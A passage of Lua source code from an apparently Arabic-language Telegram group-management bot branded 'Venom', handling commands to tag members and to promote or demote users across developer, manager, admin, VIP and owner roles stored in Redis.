if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevAbs:get(Venom..'Abs:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function VenomTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local VenomTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,VenomTEAM, 1, 'md') 
local VenomTEAM = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..VenomTEAM[math.random(#VenomTEAM)], 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,VenomTEAM)
end
end
end
--     Source Venom     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbs:sismember(Venom..'Abs:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbs:sismember(Venom..'Abs:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAbs:sismember(Venom..'Abs:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAbs:sismember(Venom..'Abs:VipAll:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbs:sismember(Venom..'Abs:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbs:sismember(Venom..'Abs:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbs:sismember(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(Venom..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..sudobot..managerall..adminall..vpall..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙لم تتم ترقيته مسبقا")  
end
if AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbs:srem(Venom..'Abs:SecondSudo:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:SudoBot:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:ManagerAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:AdminAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAbs:srem(Venom..'Abs:SudoBot:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:ManagerAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:AdminAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAbs:srem(Venom..'Abs:ManagerAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:AdminAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'absconstructor' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbs:sismember(Venom..'Abs:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbs:sismember(Venom..'Abs:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAbs:sismember(Venom..'Abs:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAbs:sismember(Venom..'Abs:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbs:sismember(Venom..'Abs:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbs:sismember(Venom..'Abs:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(Venom..'Abs:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbs:sismember(Venom..'Abs:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(Venom..'Abs:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..sudobot..managerall..adminall..vpall..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","𖠧︙لم تتم ترقيته مسبقا")  
end 
if AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbs:srem(Venom..'Abs:SecondSudo:', result.id_)
DevAbs:srem(Venom..'Abs:SudoBot:', result.id_)
DevAbs:srem(Venom..'Abs:ManagerAll:', result.id_)
DevAbs:srem(Venom..'Abs:AdminAll:', result.id_)
DevAbs:srem(Venom..'Abs:VipAll:', result.id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAbs:srem(Venom..'Abs:SudoBot:', result.id_)
DevAbs:srem(Venom..'Abs:ManagerAll:', result.id_)
DevAbs:srem(Venom..'Abs:AdminAll:', result.id_)
DevAbs:srem(Venom..'Abs:VipAll:', result.id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAbs:srem(Venom..'Abs:ManagerAll:', result.id_)
DevAbs:srem(Venom..'Abs:AdminAll:', result.id_)
DevAbs:srem(Venom..'Abs:VipAll:', result.id_)
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'absconstructor' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Constructor:'..msg.chat_id_,result.id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:Managers:'..msg.chat_id_, result.id_)
elseif AbsDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAbs:srem(Venom..'Abs:Admins:'..msg.chat_id_, result.id_)
DevAbs:srem(Venom..'Abs:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source Venom     --
--     Set SecondSudo     --
if Sudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المطورين الثانويين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
DevAbs:sadd(Venom..'Abs:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المطورين الثانويين")  
end
--     Source Venom     --
--     Rem SecondSudo     --
if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المطورين الثانويين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
DevAbs:srem(Venom..'Abs:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المطورين الثانويين")  
end end
--     Source Venom     --
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطور') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المطورين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
DevAbs:sadd(Venom..'Abs:SudoBot:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المطورين")  
end
--     Source Venom     --
--       Rem SudoBot      --
if text ==('حذف مطور') or text ==('تنزيل مطور') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المطورين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
DevAbs:srem(Venom..'Abs:SudoBot:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المطورين")  
end end
--     Source Venom     --
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('رفع مدير عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المدراء العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير عام (%d+)')
DevAbs:sadd(Venom..'Abs:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المدراء العامين")  
end
--     Source Venom     --
--      Rem ManagerAll    --
if text ==('تنزيل مدير عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المدراء العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
DevAbs:srem(Venom..'Abs:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المدراء العامين")  
end end
--     Source Venom     --
--      Set adminall      --
if ManagerAll(msg) then
if text ==('رفع ادمن عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة الادمنيه العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevAbs:sadd(Venom..'Abs:AdminAll:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة الادمنيه العامين")  
end
--     Source Venom     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة الادمنيه العامين")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevAbs:srem(Venom..'Abs:AdminAll:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة الادمنيه العامين")  
end end
--     Source Venom     --
--       Set Vipall       --
if AdminAll(msg) then
if text ==('رفع مميز عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه في قائمة المميزين العام")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevAbs:sadd(Venom..'Abs:VipAll:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه في قائمة المميزين العام")  
end
--     Source Venom     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(Venom..'Abs:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تنزيله من قائمة المميزين العام")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevAbs:srem(Venom..'Abs:VipAll:',user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تنزيله من قائمة المميزين العام")  
end end
--     Source Venom     --
--   Set AbsConstructor   --
if ChatType == 'sp' or ChatType == 'gp'  then
if SudoBot(msg) then
if text ==('رفع مالك') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(Venom..'Abs:AbsConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه مالك")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مالك @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(Venom..'Abs:AbsConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم رفعه مالك")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مالك (%d+)') and SourceCh(msg) then
local user = text:match('رفع مالك (%d+)')
DevAbs:sadd(Venom..'Abs:AbsConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","𖠧︙تم رفعه مالك")  
end
--     Source Venom     --
--   Rem AbsConstructor   --
if text ==('تنزيل مالك') and SourceCh(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAbs:srem(Venom..'Abs:AbsConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من المالكين")  
end end end
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
